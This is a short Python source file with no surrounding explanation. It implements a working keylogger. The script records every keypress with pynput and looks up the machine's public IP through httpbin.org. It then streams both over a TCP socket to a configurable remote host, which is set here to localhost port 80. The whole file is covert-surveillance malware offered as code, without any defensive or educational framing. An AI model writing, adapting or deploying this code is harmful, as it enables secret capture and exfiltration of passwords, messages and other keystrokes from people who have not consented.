from pynput.keyboard import Listener
import socket, urllib.request, threading
class Keylogger:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.selfip = self.getip()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.ip,self.port))
        self.client.send(self.selfip.encode())
        self.logger = threading.Thread(target=self.start_logging)
        self.logger.start()
    def getip(self):
        try:
            url = 'https://httpbin.org/ip'
            req = urllib.request.Request(url)
            result = urllib.request.urlopen(req)
            try:
                result = result.read().decode()
            except:
                result = result.read()
            contents = result.split()
            ip = contents[2].strip('"')
            return str(ip)
        except:
            pass
    def on_press(self,key):
        self.client.send(str(key).encode())
    def on_release(self,key):
        pass
    def start_logging(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
keylog = Keylogger("localhost",80)